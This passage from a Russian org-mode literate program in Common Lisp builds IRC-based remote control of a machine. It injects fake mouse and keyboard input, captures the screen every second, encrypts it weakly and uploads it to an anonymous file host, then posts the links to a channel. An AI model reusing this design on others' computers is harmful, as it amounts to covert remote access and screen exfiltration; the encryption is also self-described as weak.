   ,*tmpkey*
   ,*receiver*)
#+END_SRC

** Remote GUI: moving & actions
:PROPERTIES:
:xtest: xlib/xtest
:END:

#+NAME: get_property
#+BEGIN_SRC elisp :var prop=""
  (org-entry-get nil prop t)
#+END_SRC

Для управления GUI-программами на узле нам нужны возможности по управлению мышью. Тут приведен код, функции которого можно вызывать.

~perform-mouse-action~ создает фейковое событие мышки, а ~perform-key-action~ создает фейковое событие клаиватуры. Обе функции принимают первым параметров ~t~ или ~nil~, что соответствует "нажать" и "отпустить", затем ~keysym~.

~perform-mouse-action~ принимает еще и координаты, куда следует кликнуть "мышкой".

#+NAME: remote_gui
#+BEGIN_SRC lisp :noweb yes
  (defun x-move (x y)
    (if (and (integerp x) (integerp y))
        (with-default-display-force (d)
          (<<get_property("xtest")>>:fake-motion-event d x y))
        (error "Integer only for position, (x: ~S, y: ~S)" x y)))

  (defun mklist (obj)
    (if (and
         (listp obj)
         (not (null obj)))
        obj (list obj)))

  (defmacro defun-with-actions (name params actions &body body)
    ;; "This macro defun a function which witch do mouse or keyboard actions,
    ;; body is called on each action."
    `(defun ,name ,params
       (mapcar
        #'(lambda (action)
            ,@body)
        (mklist ,actions))))

  (defun perform-mouse-action (press? button &key x y)
    (and x y (x-move x y))
    (with-default-display-force (d)
      (<<get_property("xtest")>>:fake-button-event d button press?)))

  (defun perform-key-action (press? keycode) ; use xev to get keycode
    (with-default-display-force (d)
      (<<get_property("xtest")>>:fake-key-event d keycode press?)))

  (macrolet ((def (name actions)
               `(defun-with-actions ,name
                    (&key (button 1) x y)
                  ,actions
                  (funcall #'perform-mouse-action
                           action button :x x :y y))))
    (def x-mouse-down t)
    (def x-mouse-up nil)
    (def x-click '(t nil))
    (def x-dbclick '(t nil t nil)))

  (defmacro with-scroll (pos neg clicks x y)
    `(let ((button (cond
                     ((= 0 ,clicks) nil)
                     ((> 0 ,clicks) ,pos)    ; scroll up/right
                     ((< 0 ,clicks) ,neg)))) ; scroll down/left
       (dotimes (_ (abs ,clicks))
         (x-click :button button :x ,x :y ,y))))

  (defun x-vscroll (clicks &key x y)
    (with-scroll 4 5 clicks x y))

  (defun x-scroll (clicks &key x y)
    (x-vscroll clicks :x x :y y))

  (defun x-hscroll (clicks &key x y)
    (with-scroll 7 6 clicks x y))

  (macrolet ((def (name actions)
               `(defun-with-actions ,name (keycode)
                  ,actions
                  (funcall #'perform-key-action
                           action keycode))))
    (def x-key-down t)
    (def x-key-up nil)
    (def x-press '(t nil)))

  ;; (block perform-key-action-test
  ;;   (perform-key-action t 116)
  ;;   (sleep .1)
  ;;   (perform-key-action nil 116))

  ;; (defparameter *mouse-left* 1)

  ;; (defparameter *mouse-middle* 2)

  ;; (block perform-mouse-action-test
  ;;   (perform-mouse-action t *mouse-left* :x 100 :y 100)
  ;;   (sleep .1)
  ;;   (perform-mouse-action nil *mouse-left* :x 100 :y 100))
#+END_SRC

* Snapshot function

Сама функция скриншота должна каждую секунду делать скриншот, загружать его на файлообменник, получать ссылку на файл и отправлять ее в irc-канал.

В будущем, когда я добавлю веб-камеру к роботу-пылесосу, такой же процесс можно будет реализовать и для картинок с неё. Аналогичный процесс планируется для значений температуры и влажности.

За формирование скриншота отвечает кодовый блок ~x_snapshot~ и одноименная функция.

Чтобы сократить количество передаваемых данных мы используем несколько приемов.

Во-первых, мы будем передавать двуцветные черно-белые изображения - по ним легко визуально распознать то что происходит, но при этом мы можем тратить только один бит на точку. Мы будем упаковывать по 8 таких бит в байт и формировать PNG-файл с цветовым пространством 256 градаций серого. За эту часть работы отвечает ~pack-img~.

:NOTE:

  [TODO:gmm] Возможно, оптимальнее было бы найти способ сохранять правильную модель цвета, на это указывает, например вот такой пассаж о PNG-формате:

  #+BEGIN_EXAMPLE
    В заголовке IHDR указана ширина и высота, глубина цвета (1,2,4,8 или 16 бит) и формат пикселя - Grayscale, RGB, Palette, GrayscaleAlpha, RGBA, там же тип компрессии (пока что всегда 0: zlib) и тип фильтрации (тоже всегда 0, что означает 5 фильтров предикторов None, Sub, Up, Average и Paeth, с выбором одного из 5 в начале каждой строки).
  #+END_EXAMPLE

  Но это требует глубже разобраться в PNG-формате, хотя и открывает возможности по управлению сжатием и добавлению текстовых данных в файлы.

:END:

Второй способ сократить количество передаваемых данных - передавать не все изображение, а только те точки, в которых оно отличается от предыдущего переданного изображения.

Однако, в этом случае правильное отображение зависит от того, получил ли приемник начальное изображение.

Решение состоит в том, чтобы передавать полное изображение (ключевой кадр) один раз в последовательности из нескольких. Остальные изображения будут содержать только отличающиеся точки относительно предыдущего состояния. Несмотря на то, что черные точки тоже передаются - эксперименты показывают, что PNG эффективно сжимает большие черные участки.

Важным моментом тут является то, что в общем случае невозможно гарантировать успех загрузки изображения на файлообменник. В случае сбоя мы должны в следующий раз пытаться загрузить "ключевой кадр". Для этого ~wrap-img~ возвращает T в случае успеха и NIL - если произошел сбой.

Кроме того, по соображениям безопасности стоит шифровать изображения после сжатия. Это шифрование нельзя назвать стойким, возможна атака на открытый текст, так как формат PNG предсказуем. Кроме того, в качестве ключа мы гамму, генератор которой инициализируется таймштампом узла (в канале могут быть одновременно несколько узлов).

В общем, шифрование так себе ([TODO:gmm]), но большего пока не требуется даже для отправляемых узлу комманд, хотя тут и существуют угрозы безопасности.

#+NAME: shot
#+BEGIN_SRC lisp :noweb yes
  ;; x_snapshot
  <<x_snapshot>>

  ;; pack_image
  <<pack_img>>

  ;; wrap_img
  <<wrap_img>>

  ;; get_img_diff
  (declaim (inline get-img-diff))

  (defun get-img-diff (dims prev snap)
    (let ((diff (make-array dims :element-type '(unsigned-byte 8))))
      (do ((qy 0 (incf qy)))
          ((= qy (car dims)))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx (cadr dims)))
          (declare (type fixnum qx))
          (setf (aref diff qy qx)
                (logxor (aref prev qy qx)
                        (aref snap qy qx)))))
      diff))

  ;; shot
  (let ((prev)
        (cnt 9999))
    (defun shot ()
      (declare (inline get-img-diff))
      (let* ((snap (pack-img (x-snapshot)))
             (dims (array-dimensions snap)))
        (if (> cnt *max-diffs-cnt*)
            (progn ;; key frame
              (wrap-img "~A" dims snap)
              (setf prev snap)
              (setf cnt 0))
            ;; else - diff
            (if (wrap-img (format nil "~~A_~A" cnt) dims
                          (get-img-diff dims prev snap))
                (progn
                  (setf prev snap)
                  (incf cnt))
                ;; else: wrap failure
                (setf cnt 9999))))))
#+END_SRC

** Wrap image

За шифрование изображения, загрузку его на файлообменник, получение ссылки и отправку её в канал отвечает функция ~wrap-img~. Она выполняет следующую последовательность операций:
- Формирует PNG-объект из двухмерного массива точек изображения с помощью
  функции ~get-png-obj~.
- Кодирует его в PNG-формат с помощью ~get-png-seq~ получая octets.
- Складывает эти octets c гаммой, с помощью уже знакомой функции
  ~encrypt~, получая base64-string
- Заливает эту base64-string на файлообменник с помощью функции
  ~anon-file-upload~. Здесь возможны варианты - [TODO:gmm] - файлообменник может дать сбой, в этом случае следует попытаться перезалить файл. Если несколько попыток оказались неудачны - надо сделать так, чтобы следующее отправляемое изображение было ключевым кадром, а не diff-ом, так как потеряный diff не даст нам возможности распознать следующие изображения последовательности.
- Полученную из файлообменника ссылку отправляет в irc-канал. В случае
  ошибки отправляет туда содержание ошибки.

#+NAME: wrap_img
#+BEGIN_SRC lisp :noweb yes
  ;; get_png_obj
  <<get_png_obj>>

  ;; get_png_seq
  <<get_png_seq>>

  ;; anon_file_upload
  <<anon_file_upload>>

  ;; wrap-img
  (defun wrap-img (frmt-filename-str dims image)
    (let* ((height   (car  dims))
           (width    (cadr dims))
           (png      (get-png-obj width height image :grayscale))
           (png-seq  (get-png-seq png))
           (base64   (encrypt png-seq *irc-sess*))
           (filename (format nil frmt-filename-str
                             (format nil "~A" (get-universal-time))))
           (json     "")
           (result   (handler-case
                         (progn
                           (setf json (anon-file-upload filename base64))
                           (cl-json:decode-json-from-string json))
                       (JSON:JSON-SYNTAX-ERROR (err)
                         (dbg "::wrap-img error: ~A~%~A~%"  (type-of err) json)
                         (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                         (return-from wrap-img nil))
                       (t (err)
                         (dbg "::wrap-img error: ~A~%" (type-of err))
                         (sendmsg "ERR(wrap-img): [~A]" (type-of err))
                         (return-from wrap-img nil))))
           (link     (if (cdr (assoc :status result))
                         (subseq (cdadr (cadadr (assoc :data result))) 20)
                         nil)))
      (if link
          (sendmsg link)
          (sendmsg result))
      t))
#+END_SRC

*** Get PNG object

Функция ~get-png-obj~ вызывается из ~wrap-img~ и возвращает PNG-объект с содержимым, сформированным из переданного в нее двумерного массива.

#+NAME: get_png_obj
#+BEGIN_SRC lisp
  (defun get-png-obj (width height image &optional (color-type :truecolor-alpha))
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type color-type))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height width (zpng:samples-per-pixel png))
                    :displaced-to image :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      png))
#+END_SRC

*** Get PNG sequence

Функция ~get-png-seq~ возвращает представление PNG-файла в виде octets.

#+NAME: get_png_seq
#+BEGIN_SRC lisp
  (defun get-png-seq (png)
    (flex:with-output-to-sequence (stream)
      (zpng:write-png-stream png stream)))
#+END_SRC

*** Anon File Upload

#+NAME: anon_file_upload
#+BEGIN_SRC lisp
  ;; (setf drakma:*header-stream* *standard-output*)

  (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

  (defparameter *additional-headers*
    `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
      ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
      ("Accept-Charset" . "utf-8")))

  (defun get-csrf (text)
    (loop :for str :in (split-sequence:split-sequence #\Newline text)
       :do (multiple-value-bind (match-p result)
               (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
             (when match-p (return (aref result 0))))))

  (defun get-cookies-alist (cookie-jar)
    "Получаем alist с печеньками из cookie-jar"
    (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
         (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

  (defun anon-file-upload (filename content)
    (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
      ;; load mainpage for cookies, headers and csrf
      (multiple-value-bind (body-or-stream ;; status-code headers uri
                            ;;stream must-close reason-phrase
                            )
          (drakma:http-request "https://anonfile.com/"
                               :user-agent *user-agent*
                               :redirect 10
                               :force-binary t
                               :cookie-jar cookie-jar
                               :additional-headers *additional-headers*)
        (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
               (csrf (get-csrf text))
               (boundary "---------------------------196955623314664815241571979859")
               (type-header (format nil "multipart/form-data; boundary=~A" boundary))
               (new-headers `(("Accept" . "application/json")
                              ("Accept-Language" . "en-US,en;q=0.5")
                              ("Cache-Control" . "no-cache")
                              ("X-Requested-With" . "XMLHttpRequest")
                              ("X-CSRF-Token" . ,csrf)
                              ("Origin" . "https://anonfile.com")
                              ("Referer" . "https://anonfile.com/")
                              ("Content-Type" . ,type-header)
                              ("TE" . "Trailers"))))
          (multiple-value-bind (body-or-stream ;; status-code headers uri
                                ;;stream must-close reason-phrase
                                )
              (drakma:http-request
               "https://api.anonfile.com/upload"
               :user-agent *user-agent*
               :method :post
               :form-data t
               :content (format nil "--~A
  Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
  Content-Type: application/octet-stream

  ~A
  --~A--" boundary filename content boundary)
               :cookie-jar cookie-jar
               :additional-headers new-headers
               :force-binary t)
            (flex:octets-to-string body-or-stream :external-format :utf-8))))))
#+END_SRC

** Packing image

Нам нужна функция, для быстрой упаковки изображения. Она не тривиальна.

Мы берем полноцветное изображение и используем два вложенных цикла, проходя по ~Y~ и ~X~ чтобы обработать каждую точку. После обработки одна точка должна занимать только один бит.

Мы также должны упаковать по восемь точек в байт, но если размер изображения в точках не кратен байту, то нужно дополнить недостающие точки. За это отвечате внутренний макрос ~byte-finiser~, который вызывается по мере накопления значений в байте и в конце обработки строки, если это необходимо.

#+NAME: pack_img
#+BEGIN_SRC lisp
  (defun pack-img (image)
    (declare (optimize (speed 3) (safety 0)))
    (let* ((dims (array-dimensions image))
           (height (car dims))
           (width (cadr dims))
           (new-width (ash (logand (+ width 7) (lognot 7)) -3))
           (need-finisher (not (equal new-width (ash width -3))))
           (result (make-array (list height new-width)
                               :element-type '(unsigned-byte 8)))
           (bp 8)
           (acc 0))
      (declare (type (unsigned-byte 8) acc)
               (type fixnum bp)
               (type fixnum width)
               (type fixnum new-width)
               (type fixnum height))
      (macrolet ((byte-finisher (acc qy qx bp)
                   `(progn
                      ;; (format t "~8,'0B(~2,'0X)" ,acc ,acc)
                      (setf (aref result ,qy (ash ,qx -3)) ,acc)
                      (setf ,acc 0)
                      (setf ,bp 8))))
        (do ((qy 0 (incf qy)))
            ((= qy height))
          (declare (type fixnum qy))
          (do ((qx 0 (incf qx)))
              ((= qx width) (when need-finisher
                              (byte-finisher acc qy qx bp)))
            (declare (type fixnum qx))
            (let* ((avg (floor (+ (aref image qy qx 0)
                                  (aref image qy qx 1)
                                  (aref image qy qx 2))
                               3))
                   (pnt (ash avg -7)))
              (declare (type fixnum avg))
              (declare (type fixnum pnt))
              (decf bp)
              (setf acc (logior acc (ash pnt bp)))
              (when (= bp 0)
                (byte-finisher acc qy qx bp))))
          ;; (format t "~%")
          ))
      result))

  ;; (disassemble 'pack-img)

  ;; TEST: pack-img
  ;; (time
  ;;  (let* ((image (pack-img (x-snapshot)))
  ;;         (dims (array-dimensions image)))
  ;;    (save-png (cadr dims)
  ;;              (car dims)
  ;;              (format nil "~A" (gensym "FILE"))
  ;;              image
  ;;              :grayscale)))
#+END_SRC

** X-Snapshot

Этот раздел описывает библиотечные функции, которые необходимы для получения снимков экрана

Работа с экраном через ~xlib~:
- Получение размеров экрана
- Получение снимков экрана

После получения размеров экрана мы сохраняем их в глобальные переменные вида ~default-*~, чтобы после работать с ними напрямую - за это отвечает вызов функции ~init-defaults~.

При формировании скришота мы перекодируем его функцией ~raw-image->png~. При оптимизации эту перекодировку следует удалить, чтобы ускорить работу, но пока нам требуется отлаживаемость а не скорость.

* Operator's Loop

Наблюдать за узлом сети и отправлять команды очень увлекательно, но хочется добавить автоматизации. Например, если глупый робот-пылесос умеет посылать в канал сообщение о том, что батарея разряжается, то умная программа-оператор, сидящая в irc-канале может начать с ним диалог, чтобы довести его до зарядной станции.

Для этого оператору нужно только уметь принимать сообщения и декодировать отправленные данные. Общая схема работы будет такая же как у супервизора: используем ~operator-loop~ и ~watchdog-timer~, чтобы циклически вызывать функцию из глобальной переменной ~*operator*~.

Каждую секунду ~operator-loop~ инкрементирует состояние переменной ~watchdog-timer~ и вызывает ~operator~. Внутри себя ~operator~ использует значение этой переменной, чтобы отслеживать зависшие потоки и завершать их.

#+NAME: operator_loop
#+BEGIN_SRC lisp :noweb yes
  <<debug>>

  (defparameter *watchdog-timer* 0)

  (defparameter *operator-stop-flag* nil)

  (defparameter *sleep-interval* 3)

  <<operator>>

  (defun operator-loop ()
    (setf *watchdog-timer* 0)
    (tagbody
     infinite
       (when *operator-stop-flag*
         (go end))
       (dbg "~%:: operator-loop WGD=~3,'OD~%" *watchdog-timer*)
       (funcall *operator*)
       (sleep *sleep-interval*)
       (incf *watchdog-timer*)
       (go infinite)
     end))

  (operator-loop)
#+END_SRC

** Operator

Оператор работает с потоками ~op-irc-th~, задача которых - обрабатывать сообщения, которые приходят из IRC-канала. Эти потоки могут зависнуть попав в необработанную ошибку или при сбое сети, поэтому оператор должен минимизировать ущерб от таких зависаний. В норме мы считаем, что должен работать один поток ~op-irc-th~.

Вторая задача оператора - осуществлять управление потоками, которые выполняют задачи. Эти задачи возникают, когда из IRC-канала приходят сообщения. В общем случае в для обработки каждого сообщения может создаваться свой поток, при этом в силу (возможно) нестабильной работы сети, часть из этих потоков может зависать. Это не должно сказываться на роботоспособности всей программы.

Оператору для работы потребуются вспомогательные функции, которые:
- ищут потоки по их именам
- завершают поток
- очищают список потоков от тех, что уже завершены

Поэтому мы можем определить рамочную функцию здесь, а куски кода, которые выполняют логику работы с разными типами потоков доопределить ниже в этом же разделе.

#+NAME: operator
#+BEGIN_SRC lisp :noweb yes
  (defparameter *watchdog-timer-max* 100)

  (defparameter *task-th-stop-flag* nil)

  (defparameter *op-irc-th-stop-flag* nil)

  (defparameter *op-connection-established-flag* nil)

  (defparameter *op-irc-threads* nil)

  (defparameter *max-task-thread-cnt* 30)

  (defparameter *task-threads* nil)

  (defparameter *max-task-thread-life-time* 5)

  (defparameter *thread-operations-lock*
    (bt:make-recursive-lock "thread-operations-lock"))

  <<queues>>

  <<op_irc>>

  <<task_function>>

  (defparameter *operator*
    (lambda ()
      (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                                 (bt:all-threads))))
        (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                                :do (when (equal name nm)  (return th))))
                 (kill (th)  (handler-case (bt:destroy-thread th)
                               ;; happens, when thread destroyed already
                               (TYPE-ERROR () nil)
                               (SB-THREAD:INTERRUPT-THREAD-ERROR () nil)))
                 (kill-op-irc (th)
                   (kill th)
                   (setf *watchdog-timer* 0)
                   (setf *op-connection-established-flag* nil))
                 (clear ()
                   (bt:with-recursive-lock-held (*thread-operations-lock*)
                     (setf *task-threads*
                           (remove-if-not #'(lambda (pair)
                                              (bt:thread-alive-p (car pair)))
                                          ,*task-threads*)))))
          <<op_irc_th_management>>
          <<tasks_th_management>>
          ))))
#+END_SRC

*** op-irc-th management

Если отсутствуют потоки ~op-irc-th~ оператор будет пытаться создать один, и реинициализировать ~watchdog-timer~.

Если хотя бы один поток ~op-irc-th~ существует, но значение ~watchdog-timer~ слишком велико - он будет убит, потому что, вероятно, он завис. Ведь независший поток сбрасывал бы ~watchdog-timer~ каждый раз выполняя какую-либо операцию, например, получая сообщение.

Если значение ~watchdog-timer~ продолжает оставаться слишком большим, т.е. никакой из зависший потоков не подал признаки жизни, то при следующем запуске ~operator~ будет убит следующий поток.

И так далее, пока потоков ~op-irc-th~ не останется (или один из оживших потоков ~op-irc-th~ не обнулит таймер - например при приходе сообщения).

Когда все потоки будут уничтожены оператор будет пытаться создавать новые, сводя задачу к известной.

Так мы обеспечиваем попытки перезапуска, уничтожая все потоки когда ~watchdog-timer~ перестает обновляться и избегая ситуации, когда в канале одновременно больше одного независшего потока.

#+NAME: op_irc_th_management
#+BEGIN_SRC lisp :noweb yes
  ;; if there is no irs-thread then start it
  (when (and (null (fnd "op-irc-th"))       ;; no op-irc-th
             (null *op-irc-th-stop-flag*))  ;; no op-irc-th stop flag
    (dbg ":: operator lambda: start irc-th~%")
    (setf *watchdog-timer* 0)
    (bt:make-thread
     #'op-irc :name "op-irc-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*op-irc-thread-stop-flag* . ,*op-irc-th-stop-flag*))))
  ;; if there is irc-thread, but the watchdog-timer exceeds
  ;; or the flag is set - then kill it.
  (awhen (fnd "op-irc-th")
    (when (> *watchdog-timer*  *watchdog-timer-max*)
      (dbg ":: operator-lambda: kill op-irc-th by WDG~%")
      (kill-op-irc it))
    (when *op-irc-th-stop-flag*
      (dbg ":: operator-lambda: kill op-irc-th by FLAG~%")
      (kill-op-irc it)))
#+END_SRC

*** Task's threads management

Мы получаем задачи из очереди, которая будет определена в одном из разделов ниже. В первую очередь, необходимо следить, чтобы количество рабочих потоков не было слишком большим, убивая потоки, которые дольше всех работают. Мы считаем, что никакой поток не должен работать более ~max-task-thread-life-time~ секунд. Если он работает дольше - мы можем это позволить только если система не перегружена, т.е. общее количество потоков меньше ~max-task-thread-cnt~.

#+NAME: kill_slow_task_threads
#+BEGIN_SRC lisp :noweb yes
  (when (> (length *task-threads*) *max-task-thread-cnt*)
    (dbg ":: operator-lambda: many task threads~%")
    (loop :for (task-th . time) :in *task-threads* :do
         (dbg ":: operator-lambda-killer ~A . ~A~%" task-th time)
         (when (> (- (get-universal-time) time)
                  ,*max-task-thread-life-time*)
           (dbg ":: operator-lambda: kill task-th by lifetime exceed~%")
           (kill task-th)))
    (clear))
#+END_SRC

Кроме того, по идее, необходимо следить, [TODO:gmm] чтобы очередь не переполнялась, но я пока не решил, как именно лучше делать - прекратить ли принимать новые задачи или удалять старые: по идее все приходящие задачи для нас одинаково важны.

Переходим к выполнению задач.

Если очередь не пуста, то было бы неплохо вынуть из нее несколько задач и для каждой из них запустить поток. [TODO:gmm] Но пока я запускаю по одной задаче на итерацию.

#+NAME: start_task_thread
#+BEGIN_SRC lisp :noweb yes
  (when (< 0 (length-of-queue))
    (let* ((current-task (pop-task))
           (bindings `((*standard-output* . ,*standard-output*)
                       (*task-thread-stop-flag* . ,*task-th-stop-flag*)
                       (*current-task* . ,current-task)
                       (*op-sess* . ,*op-sess*)
                       (*op-user* . ,*op-user*)
                       (*op-serv* . ,*op-serv*)
                       (*op-chan* . ,*op-chan*)
                       (*op-lock* . ,*op-lock*)
                       (*op-conn* . ,*op-conn*)
                       (*watchdog-timer* . ,*watchdog-timer*))))
      (bt:with-recursive-lock-held (*thread-operations-lock*)
        (push (cons (bt:make-thread #'task :name "task-th"
                                    :initial-bindings bindings)
                    (get-universal-time))
              ,*task-threads*))))
#+END_SRC

Собственно функция ~TASK~, которая выполняет задачу, будет описана в соответствуюшщем разделе.

Собираем все вместе:

#+NAME: tasks_th_management
#+BEGIN_SRC lisp :noweb yes
  <<kill_slow_task_threads>>
  <<start_task_thread>>
#+END_SRC

** Operator's Irc Thread Function

Когда оператор создает новый поток в качестве функции потока он указывает ~op-irc~. Задачи этой функции:
- создать соединение с IRC-сервером
- обнулить ~watchdog-timer~
- запустить ~op-loop~ для обработки сообщений IRC

Если нет подключения к сети мы получим ошибку ~USOCKET:NS-TRY-AGAIN-CONDITION~, которая будет проигнорирована, но записана в лог, как и любые другие ошибки подключения. В этих случаях функция ~op-loop~ не будет вызвана, произойдет выход их функции потока и поток будет завершен. Обнаружив отсутствие потока супервизор перезапустит его и это приведет к следующей попытке подключения.

#+NAME: op_irc
#+BEGIN_SRC lisp :noweb yes
  (defparameter *op-sess* nil)
  (defparameter *op-user* nil)
  (defparameter *op-serv* "irc.freenode.org")
  (defparameter *op-chan* "#<<get_irc_channel_name()>>")
  (defparameter *op-lock* (bt:make-recursive-lock "op-lock"))
  (defparameter *op-conn* nil)

  <<op_loop>>

  (defun op-irc ()
    "operator's irc thread func"
    (setf *op-sess* (get-universal-time))
    (setf *op-user* (format nil "op~A" *op-sess*))
    (setf *op-conn*
          (handler-case
              (cl-irc:connect :nickname *op-user* :server *op-serv*)
            (USOCKET:NS-TRY-AGAIN-CONDITION (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)
            (t (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)))
    (when *op-conn*
      (dbg "::op irc conn:~A~%" *op-conn*)
      (setf *watchdog-timer* 0)
      (op-loop)))
#+END_SRC

** Operator's Loop

На этом месте текущий поток должен запустить поток-помошник, который инжектирует хук, подключитья к каналу и установит ~op-connection-established-flag~.

Запустив этот поток, можно сразу же зациклиться читая сообщения - дальше будут работать установленные хуки. Они будут вызываться в контексте текущего потока, асинхронно, из функции пакета ~cl-irc~.

#+NAME: op_loop
#+BEGIN_SRC lisp :noweb yes
  <<op_helper>>

  (defun op-loop ()
    (bt:make-thread
     #'op-helper :name "op-helper-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*op-sess* . ,*op-sess*)
       (*op-user* . ,*op-user*)
       (*op-serv* . ,*op-serv*)
       (*op-chan* . ,*op-chan*)
       (*op-lock* . ,*op-lock*)
       (*op-conn* . ,*op-conn*)))
    (handler-case (cl-irc:read-message-loop *op-conn*)
      (SB-INT:SIMPLE-STREAM-ERROR (err)
        (dbg ":: op-loop error: ~A~%" (type-of err)))
      ;; (t (err)
      ;;   (dbg "::op-loop error: ~A~%" (type-of err)))
      ))
#+END_SRC

*** Operator's helper thread

Поток-помошник занимается только тем, что устанавливает хук, джоинится в канал и отправляет приветственное сообщение о том что он в канале.

#+NAME: op_helper
#+BEGIN_SRC lisp :noweb yes
  (defmacro sendmsg (msg &rest params)
    `(bt:with-recursive-lock-held (*op-lock*)
       (cl-irc:privmsg *op-conn* *op-chan* (format nil ,msg ,@params))))

  ;; op-hook
  <<op_hook>>

  (defun op-helper ()
    (sleep 1)
    (cl-irc:add-hook *op-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'op-msg-hook)
    (sleep 1)
    (bt:with-recursive-lock-held (*op-lock*)
      (cl-irc:join *op-conn* *op-chan*))
    (sleep 1)
    (bt:with-recursive-lock-held (*op-lock*)
      (setf *op-connection-established-flag* t))
    (sendmsg "op here"))
#+END_SRC

** Operator's Message Hook

Собственно хук, который обрабатывает приходящие в канал сообщения. Он вынесен в глобальную переменную для удобства замены на лету.

Чтобы предотвратить последующую обработку процедура хука должна возвращать T.

#+NAME: op_hook
#+BEGIN_SRC lisp :noweb yes
  ;; op_cmd_proc
  <<op_cmd_proc>>

  (defun op-msg-hook (param)
    "MUST return T for stop hooks processing"
    (funcall *op-cmd* param)
    t)
#+END_SRC

** Rule-based Command Processor

Ну вот, теперь осталось правильно реагировать на команды. Чтобы распознать команду мы будем применять диспетчер, работающий как система правил. Он опирается на список правил, каждая из которых представляет пару (условие . действие).

Правила должны иметь возможность делать что-то асинхронно, для этого мы подключаем механизм очередей.

#+NAME: op_cmd_proc
#+BEGIN_SRC lisp :noweb yes
  <<shot_rule>>
  <<hi_rule>>
  <<k_rule>>

  (defparameter *op-rules*
    (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
          (cons #'hi-rule-antecedent    #'hi-rule-consequent)
          (cons #'k-rule-antecedent     #'k-rule-consequent)))

  (defparameter *op-cmd*
    (lambda (param)
      (block op-cmd-block
        (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
               (src  (CL-IRC:SOURCE param))
               ;; (oct  (decrypt msg *op-sess*))
               ;; (str  (handler-case
               ;;           (flex:octets-to-string oct :external-format :utf-8)
               ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
               (str msg)
               )
          (dbg ":: op-cmd ~A: ~A~%" src str)
          (block op-rules-dispatcher
            (let ((applyed_rules 0))
              (loop :for (antecedent . consequent) :in *op-rules* :do
                   (when (funcall antecedent str src)
                     (incf applyed_rules)
                     (dbg ":: op-cmd rule: ~A~%" consequent)
                     (when (funcall consequent str src)
                       (return-from op-rules-dispatcher nil))))
              (when (> 0 applyed_rules)
                (dbg "::UNKMSG [~A] from [~A]~%" str src))
              (finish-output)))
          ))))
#+END_SRC

** Shot Rule

Правило для скриншотов просто проверяет сообщение на соответствие регулярному выражению. Если есть совпадение - мы должны как минимум скачать и сохранить данные.

Однако, скачивание может наткнуться на сбой сети и зависнуть, и в этом случае хук никогда не завершиться и соответственно зависнет цикл чтения IRC-сообщений, потому что хук выполняется в его контексте. Поэтому вместо того, чтобы начать скачивание и обработку - мы делаем отложенную задачу и помещаем её в очередь.

#+NAME: shot_rule
#+BEGIN_SRC lisp :noweb yes
  (defun shot-rule-antecedent (str src)
    (declare (ignore src))
    (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

  (defun shot-rule-consequent (str src)
    (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
         (length-of-queue) src str)
    (ins-task (make-task :class 'task
                         :data (list str src)
                         :code #'identity)))

  ;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
#+END_SRC

** Queues

Когда мы скачиваем файл с файлообменника - это может окончиться неудачей. В этом случае удобно обрабатывать такие сбои в CPS-стиле, особенно когда мы хотим запускать скачку паралельно, в несколько потоков.

Чтобы отвязать запуск потоков от системы правил мы будем использовать очередь, в которую будем добавлять задания на обработку. Преимуществом такого подхода может быть возможность ссылаться на ранее выполнявшиеся задания.

Структуру задания определим так:

#+NAME: task
#+BEGIN_SRC lisp
  (defstruct task
    class
    data
    code)
#+END_SRC

Для обслуживания очереди нам понадобится сама очередь и блокировка на ней:

#+NAME: task_queue
#+BEGIN_SRC lisp
  (defparameter *task-queue* nil)
  (defparameter *task-queue-lock* (bt:make-lock "task-queue-lock"))
#+END_SRC

Теперь можно добавить операции для добавления и удаления из очереди заданий.

#+NAME: task_queue_ops
#+BEGIN_SRC lisp
  (defun ins-task (task)
    (bt:with-lock-held (*task-queue-lock*)
      (setf *task-queue*
            (append *task-queue*
                    (list task)))))

  (defun pop-task ()
    (bt:with-lock-held (*task-queue-lock*)
      (pop *task-queue*)))

  (defun length-of-queue ()
    (bt:with-lock-held (*task-queue-lock*)
      (length *task-queue*)))
#+END_SRC

Теперь соединим все вместе

[TODO:gmm] Надо еще добавить менеджер очередей в отдельном потоке, который разбирает и выполняет задачи.

#+NAME: queues
#+BEGIN_SRC lisp :noweb yes
  <<task>>
  <<task_queue>>
  <<task_queue_ops>>
#+END_SRC

** Task Function

Эта функция вызывается каждый раз, когда нужно обработать задачу из очереди. Она получает задачу в переменной ~current-task~.

Сейчас ей остается только вызвать ~shot-downloader~, передав ему параметры из задачи.

#+NAME: task_function
#+BEGIN_SRC lisp :noweb yes
  <<shot_downloader>>

  (defun task ()
    (destructuring-bind (str src)
